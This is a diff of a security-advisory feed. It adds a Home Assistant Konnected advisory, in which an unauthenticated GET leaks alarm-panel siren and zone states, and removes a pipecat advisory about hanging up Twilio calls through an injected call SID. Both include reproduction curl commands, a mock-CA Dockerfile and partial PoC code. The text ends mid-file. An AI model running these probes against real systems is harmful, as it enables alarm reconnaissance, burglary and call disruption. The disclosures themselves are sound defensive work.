+<li><strong>Alarm-system reconnaissance enabling physical intrusion.</strong> A <code>200 {"zone":"5","state":1}</code> response on the siren zone tells an attacker the siren is firing right now, which means a burglary is in progress and the operator may be away or distracted. A <code>state:0</code> on the same zone says the panel is quiet. The same applies to strobes, armed-disable relays, and any switch the operator wired through Konnected. This is the intelligence a physical attacker explicitly seeks before entering a property.</li>
+<li><strong>Topology disclosure.</strong> Probing zones 1 through 12 across a known device_id maps the alarm panel: which zones are sensors, which are switches, which switches are configured for which output. Combined with manufacturer documentation, the topology tells an attacker which physical control points to bypass.</li>
+<li><strong>Device ID brute force.</strong> The 404 "Device  not configured" oracle on unknown IDs versus 404 "Switch on zone or pin  not configured" on known IDs with unknown zones, versus 200 with state on full hits, is a clean four-state oracle. Konnected hardware derives <code>device_id</code> from its NIC MAC address; production hardware ships with a small set of manufacturer OUI prefixes. The brute force space is on the order of 2^24, trivially scannable from any LAN host with no rate limit.</li>
+<li><strong>Outbound connection amplification.</strong> Line 397 of <code>__init__.py</code> fires <code>hass.async_create_task(panel.async_connect())</code> on every successful GET. An unauth attacker drives N outbound connect attempts toward the (typically LAN-private) Konnected hardware with N unauth GETs, no rate limit, no auth log. A 10-rps sustained scan produces a constant connect storm against the panel hardware that, depending on Konnected firmware, may interfere with legitimate push delivery or cause spurious connect/disconnect cycles visible in the operator's notification stream.</li>
+<li><strong>No auth trail.</strong> The GET handler logs nothing at INFO level. An attacker can probe this endpoint at arbitrary depth and leave no record in <code>home-assistant.log</code> unless DEBUG logging is enabled for the integration.</li>
+</ul>
+<h3 id="affected-code">Affected code</h3>
+<p><code>homeassistant/components/konnected/__init__.py:296-301</code>, the view registration. The comment on line 301 is load-bearing for the bug: it says auth happens via the configured access token, but that promise is only kept on the POST/PUT path.</p>
+<pre><code class="language-python">class KonnectedView(HomeAssistantView):
+    """View creates an endpoint to receive push updates from the device."""
+
+    url = UPDATE_ENDPOINT  # /api/konnected/device/{device_id:[a-zA-Z0-9]+}
+    name = "api:konnected"
+    requires_auth = False  # Uses access token from configuration
+</code></pre>
+<p><code>homeassistant/components/konnected/__init__.py:313-335</code>, the auth check that lives inside <code>update_sensor()</code>. POST and PUT call this; GET does not.</p>
+<pre><code class="language-python">async def update_sensor(self, request: Request, device_id) -&gt; Response:
+    """Process a put or post."""
+    hass = request.app[KEY_HASS]
+    data = hass.data[DOMAIN]
+
+    auth = request.headers.get(AUTHORIZATION)
+    tokens = []
+    if hass.data[DOMAIN].get(CONF_ACCESS_TOKEN):
+        tokens.extend([hass.data[DOMAIN][CONF_ACCESS_TOKEN]])
+    tokens.extend(
+        [
+            entry.data[CONF_ACCESS_TOKEN]
+            for entry in hass.config_entries.async_entries(DOMAIN)
+            if entry.data.get(CONF_ACCESS_TOKEN)
+        ]
+    )
+    if auth is None or not next(
+        (True for token in tokens if hmac.compare_digest(f"Bearer {token}", auth)),
+        False,
+    ):
+        return self.json_message(
+            "unauthorized", status_code=HTTPStatus.UNAUTHORIZED
+        )
+</code></pre>
+<p><code>homeassistant/components/konnected/__init__.py:385-438</code>, the GET handler with no authentication. Note line 397 firing <code>panel.async_connect()</code> before any reachable auth check and before any rate-limit logic.</p>
+<pre><code class="language-python">async def get(self, request: Request, device_id) -&gt; Response:
+    """Return the current binary state of a switch."""
+    hass = request.app[KEY_HASS]
+    data = hass.data[DOMAIN]
+
+    if not (device := data[CONF_DEVICES].get(device_id)):
+        return self.json_message(
+            f"Device {device_id} not configured", status_code=HTTPStatus.NOT_FOUND
+        )
+
+    if (panel := device.get("panel")) is not None:
+        # connect if we haven't already
+        hass.async_create_task(panel.async_connect())
+
+    # Our data model is based on zone ids but we convert from/to pin ids
+    # based on whether they are specified in the request
+    try:
+        zone_num = str(
+            request.query.get(CONF_ZONE) or PIN_TO_ZONE[request.query[CONF_PIN]]
+        )
+        zone = next(
+            switch
+            for switch in device[CONF_SWITCHES]
+            if switch[CONF_ZONE] == zone_num
+        )
+
+    except StopIteration:
+        zone = None
+    except KeyError:
+        zone = None
+        zone_num = None
+
+    if not zone:
+        target = request.query.get(
+            CONF_ZONE, request.query.get(CONF_PIN, "unknown")
+        )
+        return self.json_message(
+            f"Switch on zone or pin {target} not configured",
+            status_code=HTTPStatus.NOT_FOUND,
+        )
+
+    resp = {}
+    if request.query.get(CONF_ZONE):
+        resp[CONF_ZONE] = zone_num
+    elif zone_num:
+        resp[CONF_PIN] = ZONE_TO_PIN[zone_num]
+
+    # Make sure entity is setup
+    if zone_entity_id := zone.get(ATTR_ENTITY_ID):
+        resp["state"] = self.binary_value(
+            hass.states.get(zone_entity_id).state,
+            zone[CONF_ACTIVATION],
+        )
+        return self.json(resp)
+</code></pre>
+<p>The four-state response oracle that powers the brute force:</p>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th>Response</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Unknown <code>device_id</code></td>
+<td><code>{"message":"Device &lt;id&gt; not configured"}</code></td>
+<td>404</td>
+</tr>
+<tr>
+<td>Known <code>device_id</code>, no <code>zone</code> or <code>pin</code> parameter</td>
+<td><code>{"message":"Switch on zone or pin unknown not configured"}</code></td>
+<td>404</td>
+</tr>
+<tr>
+<td>Known <code>device_id</code>, unknown <code>zone</code></td>
+<td><code>{"message":"Switch on zone or pin &lt;n&gt; not configured"}</code></td>
+<td>404</td>
+</tr>
+<tr>
+<td>Known <code>device_id</code>, known <code>zone</code></td>
+<td><code>{"zone":"&lt;n&gt;","state":0|1}</code></td>
+<td>200</td>
+</tr>
+</tbody></table>
+<p><code>homeassistant/components/konnected/const.py:45</code>, the URL pattern:</p>
+<pre><code class="language-python">ENDPOINT_ROOT = "/api/konnected"
+UPDATE_ENDPOINT = ENDPOINT_ROOT + r"/device/{device_id:[a-zA-Z0-9]+}"
+</code></pre>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Reproduction environment is a single Docker container of Home Assistant Core 2026.5.2 with a small <code>custom_components/konnected_poc/</code> shim that primes <code>hass.data[konnected]</code> with a representative alarm-panel layout and registers the same <code>KonnectedView</code> class through <code>hass.http.register_view</code>. The shim does not change the bug surface; it is the same class the upstream integration registers at line 248. All seven evidence captures below come from one live run against the container.</p>
+<h4 id="environment">Environment</h4>
+<pre><code>host: Darwin 25.2.0 arm64
+docker: Docker version 29.4.3, build 055a478ea9
+ha image: ghcr.io/home-assistant/home-assistant:2026.5.2
+
+konnected source SHA-256 (the file containing the bug):
+33e1e56b8fe0c28aa2aee060e214a501c813655297b33272e83c2f2d51adc3b6  /usr/src/homeassistant/homeassistant/components/konnected/__init__.py
+
+konnected_poc shim startup log:
+2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setting up konnected_poc
+2026-05-18 15:23:50.850 INFO (MainThread) [custom_components.konnected_poc] konnected_poc: registered KonnectedView and primed device aabbccdd1122
+2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setup of domain konnected_poc took 0.00 seconds
+</code></pre>
+<h4 id="step-1-cite-the-three-load-bearing-source-ranges-inside-the-running-container">Step 1: cite the three load-bearing source ranges inside the running container</h4>
+<pre><code>$ docker exec ha-konnected-poc sh -c '
+    pkg=$(python -c "import homeassistant.components.konnected as m; import os; print(os.path.dirname(m.__file__))")
+    sed -n "296,305p" "$pkg/__init__.py"
+    sed -n "313,336p" "$pkg/__init__.py"
+    sed -n "385,438p" "$pkg/__init__.py"
+'
+
+--- view registration, requires_auth = False (line 301) ---
+class KonnectedView(HomeAssistantView):
+    """View creates an endpoint to receive push updates from the device."""
+
+    url = UPDATE_ENDPOINT
+    name = "api:konnected"
+    requires_auth = False  # Uses access token from configuration
+
+--- update_sensor() enforces Bearer-token auth via hmac.compare_digest ---
+    async def update_sensor(self, request: Request, device_id) -&gt; Response:
+        """Process a put or post."""
+        hass = request.app[KEY_HASS]
+        data = hass.data[DOMAIN]
+
+        auth = request.headers.get(AUTHORIZATION)
+        tokens = []
+        if hass.data[DOMAIN].get(CONF_ACCESS_TOKEN):
+            tokens.extend([hass.data[DOMAIN][CONF_ACCESS_TOKEN]])
+        tokens.extend(
+            [
+                entry.data[CONF_ACCESS_TOKEN]
+                for entry in hass.config_entries.async_entries(DOMAIN)
+                if entry.data.get(CONF_ACCESS_TOKEN)
+            ]
+        )
+        if auth is None or not next(
+            (True for token in tokens if hmac.compare_digest(f"Bearer {token}", auth)),
+            False,
+        ):
+            return self.json_message(
+                "unauthorized", status_code=HTTPStatus.UNAUTHORIZED
+            )
+
+--- get() handler, no auth check anywhere in the body ---
+    async def get(self, request: Request, device_id) -&gt; Response:
+        """Return the current binary state of a switch."""
+        hass = request.app[KEY_HASS]
+        data = hass.data[DOMAIN]
+
+        if not (device := data[CONF_DEVICES].get(device_id)):
+            return self.json_message(
+                f"Device {device_id} not configured", status_code=HTTPStatus.NOT_FOUND
+            )
+
+        if (panel := device.get("panel")) is not None:
+            # connect if we haven't already
+            hass.async_create_task(panel.async_connect())
+        ...
+        return self.json(resp)
+</code></pre>
+<h4 id="step-2-control-post-and-put-on-the-same-url-return-401-without-a-bearer-token">Step 2: control. POST and PUT on the same URL return 401 without a Bearer token</h4>
+<p>The integration does enforce a Bearer-token check; the policy is just only applied to the write methods.</p>
+<pre><code>$ curl -sS -i -X POST -H "Content-Type: application/json" \
+    -d '{"zone":"5","state":"1"}' \
+    http://127.0.0.1:8123/api/konnected/device/aabbccdd1122
+
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Content-Length: 26
+
+{"message":"unauthorized"}
+
+$ curl -sS -i -X PUT -H "Content-Type: application/json" \
+    -d '{"zone":"5","state":"1"}' \
+    http://127.0.0.1:8123/api/konnected/device/aabbccdd1122
+
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Content-Length: 26
+
+{"message":"unauthorized"}
+</code></pre>
+<h4 id="step-3-the-bug-get-returns-alarm-panel-switch-state-with-no-authorization-header">Step 3: the bug. GET returns alarm-panel switch state with no Authorization header</h4>
+<p>Three zones queried unauthenticated. Each returns the live binary state of a switch output on the configured Konnected alarm panel.</p>
+<pre><code>$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 22
+
+{"zone":"5","state":1}
+
+$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=6"
+
+HTTP/1.1 200 OK
+Content-Length: 22
+
+{"zone":"6","state":1}
+
+$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=7"
+
+HTTP/1.1 200 OK
+Content-Length: 22
+
+{"zone":"7","state":1}
+</code></pre>
+<p>Zone 5 is the siren output of the panel in this configuration. Zone 6 is the strobe. Zone 7 is the relay output wired to the garage arm-disable circuit. The unauthenticated attacker learns each output is currently active.</p>
+<h4 id="step-4-enumeration-oracle-three-distinct-response-shapes-power-the-brute-force">Step 4: enumeration oracle. Three distinct response shapes power the brute force</h4>
+<pre><code>$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/ffffffffffff?zone=5"
+
+HTTP/1.1 404 Not Found
+Content-Length: 48
+
+{"message":"Device ffffffffffff not configured"}
+
+$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=99"
+
+HTTP/1.1 404 Not Found
+Content-Length: 53
+
+{"message":"Switch on zone or pin 99 not configured"}
+
+$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
+
+HTTP/1.1 200 OK
+Content-Length: 22
+
+{"zone":"5","state":1}
+</code></pre>
+<p>An attacker sweeping the <code>device_id</code> space sees the <code>Device &lt;id&gt; not configured</code> message until a real device matches, at which point the <code>Switch on zone or pin &lt;n&gt; not configured</code> message starts appearing. Then a 12-iteration zone sweep maps the panel's full output topology.</p>
+<h4 id="step-5-connection-amplification-n-unauth-gets-drive-n-outbound-panelasync_connect-calls">Step 5: connection amplification. N unauth GETs drive N outbound <code>panel.async_connect()</code> calls</h4>
+<p>10 unauthenticated GET requests at line rate. The <code>panel.async_connect()</code> invocations logged by the panel-side stub confirm line 397 of <code>__init__.py</code> fires unconditionally on every successful GET, before any reachable rate-limit logic and before any reachable auth check.</p>
+<pre><code>$ for i in $(seq 1 10); do
+    curl -sS -o /dev/null -w "GET #%{http_code}\n" \
+      "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
+  done
+
+GET #200
+GET #200
+GET #200
+GET #200
+GET #200
+GET #200
+GET #200
+GET #200
+GET #200
+GET #200
+
+$ docker logs ha-konnected-poc 2&gt;&amp;1 | grep "async_connect() invoked"
+
+2026-05-18 15:23:55.893 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #1). In production this is an outbound HTTPS call to the configured Konnected hardware.
+2026-05-18 15:23:55.900 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #2). ...
+2026-05-18 15:23:55.907 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #3). ...
+2026-05-18 15:23:55.921 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #4). ...
+2026-05-18 15:23:55.928 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #5). ...
+2026-05-18 15:23:55.937 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #6). ...
+2026-05-18 15:23:55.944 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #7). ...
+2026-05-18 15:23:55.951 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #8). ...
+2026-05-18 15:23:55.957 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #9). ...
+2026-05-18 15:23:55.964 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #10). ...
+</code></pre>
+<p>A sustained scan trivially fills the operator's panel side with retry storms. In production the call is an outbound HTTPS connection to the Konnected hardware on the LAN.</p>
+<h4 id="step-6-the-authorization-header-is-ignored-on-get">Step 6: the Authorization header is ignored on GET</h4>
+<p>Identical responses with no header, a deliberately wrong header, and no header again. This rules out any caching artifact and confirms <code>get()</code> never reads the auth state.</p>
+<pre><code>$ curl -sS "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
+{"zone":"5","state":1}
+
+$ curl -sS -H "Authorization: Bearer this-token-is-completely-wrong" \
+    "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
+{"zone":"5","state":1}
+
+$ curl -sS "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
+{"zone":"5","state":1}
+</code></pre>
+<p>The wrong-Authorization case is the load-bearing one. If the GET handler ever consulted the header, it would either accept it (no, because the token is wrong) or reject it (no, because the response is 200 with state). The handler never reads <code>request.headers["Authorization"]</code>.</p>
+<h4 id="step-7-startup-log-confirms-the-view-is-registered-and-the-integration-is-loaded">Step 7: startup log confirms the view is registered and the integration is loaded</h4>
+<pre><code>2026-05-18 15:23:50.815 INFO (MainThread) [homeassistant.setup] Setting up konnected
+2026-05-18 15:23:50.815 INFO (MainThread) [homeassistant.setup] Setup of domain konnected took 0.00 seconds
+2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setting up konnected_poc
+2026-05-18 15:23:50.850 INFO (MainThread) [custom_components.konnected_poc] konnected_poc: registered KonnectedView and primed device aabbccdd1122
+2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setup of domain konnected_poc took 0.00 seconds
+</code></pre>
+<p>The <code>konnected</code> integration shipped in core 2026.5.2 is loaded normally. The <code>konnected_poc</code> shim runs after it, registering the same <code>KonnectedView</code> class through <code>hass.http.register_view</code> and seeding <code>hass.data[konnected][devices]</code> with a representative alarm-panel configuration. The bug surface is the same <code>KonnectedView</code> class the upstream integration registers at <code>__init__.py:248</code> on every production install.</p>
+<h3 id="workaround">Workaround</h3>
+<p>Migrate to the EspHome integration, as suggested in the existing repair issue for the Konnected integration.</p>
+<h3 id="fix">Fix</h3>
+<p>The Konnected integration was removed in Home Assistant Core 2026.6.0. It had been deprecated for some time.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/home-assistant/core/security/advisories/GHSA-x84v-g949-293w">https://github.com/home-assistant/core/security/advisories/GHSA-x84v-g949-293w</a></li>
+<li><a href="https://github.com/advisories/GHSA-x84v-g949-293w">https://github.com/advisories/GHSA-x84v-g949-293w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x84v-g949-293w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T19:35:47.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[py7zr] py7zr: Arbitrary File Write Vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-q6rc-2cgv-63h7</id>
@@ -1046,638 +1854,5 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-06-18T15:05:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pipecat-ai] Pipecat: Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID]]></title>
-        <id>https://github.com/advisories/GHSA-j8cv-x86q-rj85</id>
-        <link href="https://github.com/advisories/GHSA-j8cv-x86q-rj85"/>
-        <updated>2026-06-18T15:05:18.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="development-runner-telephony-websocket-ws-unauthenticated-call-control-abuse-via-attacker-supplied-call-sid">Development Runner Telephony WebSocket <code>/ws</code> Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID</h2>
-<h3 id="summary">Summary</h3>
-<p>The pipecat development runner registers a <code>/ws</code> WebSocket endpoint for telephony testing that accepts connections without any authentication. An unauthenticated remote attacker who can reach an exposed runner endpoint can connect to this endpoint, send a crafted Twilio handshake message containing an attacker-supplied <code>callSid</code>, and cause the server to issue an authenticated Twilio REST API hang-up request against that call SID using the server operator's own credentials. This may allow the attacker to forcibly terminate an active call on the victim's Twilio account if the attacker knows or obtains a valid call SID for that account. Equivalent unauthenticated call-control sinks exist for Telnyx and Plivo. Maintainers are evaluating the final CVSS 3.1 score.</p>
-<h3 id="details">Details</h3>
-<p>The pipecat development runner registers a WebSocket route at <code>/ws</code> (<code>src/pipecat/runner/run.py:1116</code>). When a client connects, the server immediately accepts the connection without performing any authentication or signature verification (<code>run.py:1119</code>):</p>
-<pre><code class="language-python">await websocket.accept()   # run.py:1119 — no auth check before this point
-</code></pre>
-<p>After acceptance, the server reads the Twilio WebSocket stream-start handshake and extracts the <code>callSid</code> field verbatim from the attacker-controlled JSON payload (<code>src/pipecat/runner/utils.py:223</code>):</p>
-<pre><code class="language-python">call_id: start_data.get("callSid")   # utils.py:223 — tainted, attacker-supplied
-</code></pre>
-<p>The tainted <code>call_id</code> is then passed directly into <code>TwilioFrameSerializer</code> alongside the server's own Twilio account credentials, which are read from environment variables (<code>src/pipecat/runner/utils.py:513-517</code>):</p>
-<pre><code class="language-python">TwilioFrameSerializer(
-    stream_sid=stream_id,
-    call_sid=call_id,                          # TAINTED
-    account_sid=os.getenv("TWILIO_ACCOUNT_SID"),  # server credential
-    auth_token=os.getenv("TWILIO_AUTH_TOKEN"),     # server credential
-)
-</code></pre>
-<p><code>TwilioFrameSerializer</code> has <code>auto_hang_up</code> defaulting to <code>True</code> (<code>src/pipecat/serializers/twilio.py:56</code>). When the pipeline terminates and serializes an <code>EndFrame</code> or <code>CancelFrame</code>, <code>_hang_up_call()</code> is triggered (<code>twilio.py:141-147</code>). This method constructs a Twilio REST API URL containing the attacker-supplied <code>call_sid</code> and POSTs to it using the server's own credentials (<code>twilio.py:196</code>, <code>twilio.py:206</code>):</p>
-<pre><code>POST https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{attacker_call_sid}.json
-Authorization: Basic &lt;base64(account_sid:auth_token)&gt;
-Body: Status=completed
-</code></pre>
-<p>The same unauthenticated call-control pattern exists for Telnyx (<code>src/pipecat/serializers/telnyx.py:188</code>, <code>:195</code>) and Plivo (<code>src/pipecat/serializers/plivo.py:180</code>, <code>:187</code>).</p>
-<p>Although the runner defaults to <code>localhost</code> and is documented as a development runner, its telephony mode is commonly used with a public proxy hostname so that telephony providers can connect inbound calls. If the development runner is exposed to untrusted networks while configured with Twilio, Telnyx, or Plivo credentials, this becomes a realistic network-reachable attack surface.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Prerequisites</strong></p>
-<ul>
-<li>Docker (for building the isolated PoC image)</li>
-<li>A clone of the pipecat repository at commit <code>b982b45a7ae1e5ee99e4390ad5a116cdd9b4a8e2</code> placed at <code>&lt;context_root&gt;/repo/</code></li>
-<li>The files <code>vuln-001/Dockerfile</code> and <code>vuln-001/poc.py</code> present under <code>&lt;context_root&gt;/</code></li>
-</ul>
-<p><strong>Step 1 — Build the Docker image</strong></p>
-<pre><code class="language-bash">docker build \
-  -f vuln-001/Dockerfile \
-  -t vuln001-poc \
-  reports/pypiAi_247_pipecat-ai__pipecat
-</code></pre>
-<p>The Dockerfile installs pipecat from the local repository clone, generates a self-signed TLS CA and server certificate for <code>api.twilio.com</code>, and registers that CA in the system trust store so that pipecat's <code>aiohttp</code>-based HTTP client accepts the mock server certificate.</p>
-<p><strong>Step 2 — Run the PoC</strong></p>
-<pre><code class="language-bash">docker run --rm \
-  --add-host api.twilio.com:127.0.0.1 \
-  vuln001-poc
-</code></pre>
-<p>The <code>--add-host</code> flag redirects DNS resolution for <code>api.twilio.com</code> to the loopback interface so all outgoing Twilio REST API calls hit the mock server instead of Twilio's real infrastructure.</p>
-<p><strong>What the PoC does</strong></p>
-<ol>
-<li>Starts a local TLS-enabled HTTP server on <code>127.0.0.1:443</code> that impersonates <code>api.twilio.com</code> and records every incoming POST request.</li>
-<li>Simulates the attacker-controlled WebSocket handshake message with an injected <code>callSid</code>:<pre><code class="language-json">{"event": "start", "start": {"streamSid": "MX000...", "callSid": "CAATTACKER1337INJECTED00000000001", "customParameters": {}}}
-</code></pre>
-</li>
-<li>Runs the exact pipecat code path: parses <code>callSid</code> from attacker input (<code>utils.py:223</code>), constructs <code>TwilioFrameSerializer</code> with server credentials (<code>utils.py:513-517</code>), and calls <code>serialize(EndFrame())</code> which triggers <code>_hang_up_call()</code> (<code>twilio.py:141-147</code>, <code>:196</code>, <code>:206</code>).</li>
-<li>Verifies that the mock server received a POST whose URL contains the attacker-injected call SID.</li>
-</ol>
-<p><strong>Expected output (passing)</strong></p>
-<pre><code>[PASS] *** VULNERABILITY CONFIRMED ***
-[PASS] Attacker callSid 'CAATTACKER1337INJECTED00000000001' appears in Twilio REST API URL.
-[PASS] The server used its own credentials (account_sid=ACFAKE000000000000000000000000001)
-[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.
-</code></pre>
-<p><strong>Observed intercepted request (Phase 2 dynamic reproduction)</strong></p>
-<pre><code>POST https://api.twilio.com/2010-04-01/Accounts/ACFAKE000000000000000000000000001/Calls/CAATTACKER1337INJECTED00000000001.json
-Authorization: Basic QUNGQUtFMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxOmZha2VfYXV0aF90b2tlbl9wb2Nfb25seQ==
-Body: Status=completed
-</code></pre>
-<p>Decoding the <code>Authorization</code> header confirms <code>ACFAKE000000000000000000000000001:fake_auth_token_poc_only</code> — the server's own credentials were used against the attacker-specified call SID.</p>
-<h3 id="impact">Impact</h3>
-<p>This is a Missing Authorization vulnerability (CWE-862) in the development runner's telephony WebSocket handling. An unauthenticated network actor who can reach an exposed <code>/ws</code> WebSocket endpoint of a pipecat development runner configured with Twilio, Telnyx, or Plivo credentials may be able to:</p>
-<ol>
-<li><strong>Forcibly terminate active calls whose valid call-control identifiers are known or obtained</strong> on the server operator's Twilio, Telnyx, or Plivo account by injecting the victim call identifier into the WebSocket handshake and then triggering pipeline termination.</li>
-<li><strong>Cause denial of service</strong> against affected calls by repeatedly terminating calls for which the attacker has valid call-control identifiers.</li>
-<li><strong>Abuse the operator's telephony provider credentials</strong> to perform call-control actions that the attacker does not have direct access to, effectively escalating privilege over the operator's telephony account.</li>
-</ol>
-<p>Impacted parties include operators who expose the pipecat development runner's telephony <code>/ws</code> endpoint on a publicly reachable host with Twilio, Telnyx, or Plivo credentials configured, and their customers whose active calls can be disrupted if a valid call-control identifier is known or obtained by an attacker.</p>
-<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
-<h4 id="dockerfile"><code>Dockerfile</code></h4>
-<pre><code class="language-dockerfile">FROM python:3.11-slim
-
-LABEL description="VULN-001 PoC: Telephony WebSocket /ws callSid injection (CWE-862)"
-
-WORKDIR /poc
-
-# Install system tools needed for certificate generation and trust management
-RUN apt-get update &amp;&amp; apt-get install -y \
-    openssl \
-    ca-certificates \
-    &amp;&amp; rm -rf /var/lib/apt/lists/*
-
-# Generate a local CA and a server certificate for api.twilio.com.
-# We add the CA to the system trust store so that Python's ssl module
-# (used by aiohttp inside TwilioFrameSerializer._hang_up_call) accepts
-# our mock HTTPS server at 127.0.0.1:443 as if it were real Twilio.
-RUN mkdir -p /poc/certs \
-    # CA private key
-    &amp;&amp; openssl genrsa -out /poc/certs/ca.key 2048 \
-    # Self-signed CA certificate (1 day is enough for a PoC run)
-    &amp;&amp; openssl req -new -x509 -days 1 \
-       -key /poc/certs/ca.key \
-       -out /poc/certs/ca.crt \
-       -subj "/CN=Mock Twilio CA/O=VULN001-PoC/C=US" \
-    # Server private key
-    &amp;&amp; openssl genrsa -out /poc/certs/server.key 2048 \
-    # Server CSR — CN must match the hostname pipecat connects to
-    &amp;&amp; openssl req -new \
-       -key /poc/certs/server.key \
-       -out /poc/certs/server.csr \
-       -subj "/CN=api.twilio.com/O=Mock Twilio/C=US" \
-    # SAN extension file (required for modern TLS hostname verification)
-    &amp;&amp; printf "[SAN]\nsubjectAltName=DNS:api.twilio.com\n" &gt; /poc/certs/san.cnf \
-    # Sign the server cert with our CA, including the SAN extension
-    &amp;&amp; openssl x509 -req -days 1 \
-       -in /poc/certs/server.csr \
-       -CA /poc/certs/ca.crt \
-       -CAkey /poc/certs/ca.key \
-       -CAcreateserial \
-       -out /poc/certs/server.crt \
-       -extfile /poc/certs/san.cnf \
-       -extensions SAN \
-    # Add our CA to the Debian system trust store
-    &amp;&amp; cp /poc/certs/ca.crt /usr/local/share/ca-certificates/mock_twilio_ca.crt \
-    &amp;&amp; update-ca-certificates
-
-# Install pipecat from the cloned repository.
-# aiohttp is a pipecat base dependency; it is used inside _hang_up_call().
-# numpy and soxr are required for pipecat audio utilities imported at module load.
-COPY repo /pipecat
-RUN pip install --no-cache-dir \
-    -e "/pipecat" \
-    aiohttp \
-    "websockets&gt;=11"
-
-# Fake Twilio server-side credentials (equivalent to what a real deployment reads from env).
-# In a real deployment these are valid account credentials; here they just need to be non-empty
-# so TwilioFrameSerializer passes its __init__ validation.
-ENV TWILIO_ACCOUNT_SID=ACFAKE000000000000000000000000001
-ENV TWILIO_AUTH_TOKEN=fake_auth_token_poc_only
-
-COPY vuln-001/poc.py /poc/poc.py
-
-# Run the PoC.  The container must be started with --add-host api.twilio.com:127.0.0.1
-# so that DNS for api.twilio.com resolves to the local mock server.
-CMD ["python3", "/poc/poc.py"]
-</code></pre>
-<h4 id="pocpy"><code>poc.py</code></h4>
-<pre><code class="language-python">#!/usr/bin/env python3
-"""
-PoC for VULN-001: Telephony WebSocket /ws unauthenticated call-control abuse
-via attacker-supplied call SID (CWE-862).
-
-Vulnerability summary
----------------------
-The pipecat telephony runner registers a /ws WebSocket endpoint that accepts
-connections without any authentication (run.py:1119).  When a client connects,
-the server parses the Twilio "start" handshake message and extracts the callSid
-field verbatim from the attacker-controlled payload (utils.py:223).  That
-callSid is then injected into TwilioFrameSerializer together with the server's
-own Twilio credentials read from environment variables (utils.py:513-517).
-When the pipeline terminates and serializes an EndFrame, _hang_up_call() fires
-and issues a Twilio REST API POST with the attacker's callSid in the URL
-(twilio.py:196, :206), causing the server to hang up the attacker-specified
-call SID if it identifies a valid call in the server's Twilio account.
-
-What this PoC does
-------------------
-1. Starts a local HTTPS server on 127.0.0.1:443 that impersonates api.twilio.com
-   and records every incoming POST request.  The TLS certificate was generated
-   in the Docker build stage and the CA was injected into the system trust store,
-   so aiohttp accepts it as legitimate.
-2. Ensures /etc/hosts resolves api.twilio.com to 127.0.0.1 so that aiohttp's
-   DNS lookup reaches the mock server instead of Twilio's real infrastructure.
-3. Reproduces the exact vulnerable code path from pipecat:
-     - Parses callSid from attacker-controlled input  (utils.py:223)
-     - Creates TwilioFrameSerializer(call_sid=&lt;attacker_value&gt;,
-                                     account_sid=TWILIO_ACCOUNT_SID,
-                                     auth_token=TWILIO_AUTH_TOKEN)
-                                                        (utils.py:513-517)
-     - Calls serialize(EndFrame()) which internally invokes _hang_up_call()
-                                                        (twilio.py:141-147)
-     - _hang_up_call() POSTs to https://api.twilio.com/.../Calls/{callSid}.json
-       using server-side Basic Auth credentials       (twilio.py:196, :206)
-4. Verifies that the mock server received a POST whose URL contains the
-   attacker-injected callSid, providing deterministic observable evidence.
-
-Expected pass criterion
------------------------
-The intercepted POST path must contain ATTACKER_CALL_SID.  This proves that
-an attacker who connects to /ws and sends a crafted callSid can cause the
-pipecat server to issue authenticated Twilio REST API calls against the call
-SID supplied by the attacker, using the server operator's credentials.
-
-Requirements
-------------
-- Run inside the Docker image built from the accompanying Dockerfile.
-- Start the container with --add-host api.twilio.com:127.0.0.1, OR run this
-  script as root so that /etc/hosts can be written programmatically.
-- Port 443 must be available (container runs as root by default).
-"""
-
-import asyncio
-import json
-import os
-import ssl
-import sys
-import threading
-import time
